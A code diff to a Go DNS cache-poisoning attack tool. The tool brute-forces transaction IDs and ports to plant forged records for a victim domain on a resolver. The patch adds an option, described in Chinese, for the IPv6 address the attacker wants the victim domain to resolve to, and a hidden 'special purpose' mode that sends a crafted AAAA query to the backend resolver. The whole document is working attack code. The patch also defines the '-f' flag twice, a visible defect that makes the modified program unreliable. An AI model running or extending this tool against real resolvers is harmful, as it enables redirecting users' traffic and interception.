@@ -7,11 +7,13 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket/routing"
+	"github.com/miekg/dns"
 	"log"
 	"math/rand"
 	"net"
 	"os"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 )
@@ -449,22 +451,41 @@ func main() {
 	defaultJitter := flag.Uint("j", 5, "Time gap between verification packet and the latest probe packet in a group. Increase the value if Jitter is increased.")
 	repeatTimes := flag.Uint("R", 1, "Retransmit/Reprobe a group of ports for X times to reduce FNs.")
 	timeGap := flag.Uint("tg", 0, "Time gap is us(microseconds) between the TxID brute force packets.")
-	auxiliaryDomain := flag.String("ad", "", "Attacker-controlled domain used to host the fake NS for the victim domain and to store the fake AAAA record of the victim domain.")
+	//auxiliaryDomain := flag.String("ad", "", "Attacker-controlled domain used to host the fake NS for the victim domain and to store the fake AAAA record of the victim domain.")
+	attackertarget := flag.String("at", "", "攻击者想要更改到的IPv6地址")
 	debugOutput := flag.Bool("d", false, "Debug output mode.")
 	attackerMaliciousDomain := flag.String("f", "", "Attacker controlled domain used in the forwarder attack, this will enable the forwarder attack mode.")
 	soaName := flag.String("soa", "", "SOA name of the victim domain on attacker-controlled name server used to indicate the resolver has been poisoned. (Resolver attack only.)")
 
+	//特殊用途
+	isfake := flag.String("f", "0", "")
 	flag.Parse()
 	//gatewayMac, _ := net.ParseMAC(*gateWayMacStr)
 	Main(*ifaceName, net.ParseIP(*authServer), net.ParseIP(*resolver), net.ParseIP(*resolverBackend), *startPort, *endPort, *victimDNSName, *dnsQueryTmeout, *defaultJitter,
-		*attackerMaliciousDomain, *resolverBackendList, *debugOutput, *repeatTimes, *timeGap, *auxiliaryDomain, *soaName)
+		*attackerMaliciousDomain, *resolverBackendList, *debugOutput, *repeatTimes, *timeGap, *attackertarget, *soaName, *isfake)
 	os.Exit(0)
 }
 
 func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBackendIPArg net.IP, startPort uint, endPort uint, victimDNSNameArg string, dnsQueryTimeout uint,
-	defaultJitterArg uint, attackerMaliciousDomainArg string, resolverBackendList string, debugOutputArg bool, repeatTimesArg uint, timeGapArg uint, auxiliaryDomainArg string,
-	soaNameArg string) {
+	defaultJitterArg uint, attackerMaliciousDomainArg string, resolverBackendList string, debugOutputArg bool, repeatTimesArg uint, timeGapArg uint, attackertargetIP string,
+	soaNameArg string, isfake string) {
 	fmt.Println("/***Please make sure to fill every argument carefully and correct. Otherwise the program will crash.***/")
+
+	// 特殊用途
+	if isfake == "1" {
+		c := new(dns.Client)
+		msg := new(dns.Msg)
+		if strings.Contains(attackertargetIP, ":") {
+			ipcode := strings.ReplaceAll(attackertargetIP, ":", "-")
+			domain := ipcode + "." + victimDNSNameArg
+			msg.SetQuestion(domain, dns.TypeAAAA)
+			_, _, _ = c.Exchange(msg, resolverBackendIPArg.String())
+			return
+		} else {
+			println("参数有误，请输入IPv6地址作为篡改目标结果")
+		}
+
+	}
 	rand.Seed(time.Now().UnixNano())
 	handle, _ = pcap.OpenLive(
 		ifaceName,
@@ -493,7 +514,6 @@ func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBack
 	victimDNSName = victimDNSNameArg
 	debugOutput = debugOutputArg
 	timeGap = timeGapArg
-	auxiliaryDomain = auxiliaryDomainArg
 	soaName = soaNameArg
 
 	localIP, _ = GetIfaceAddrMulti(iface)
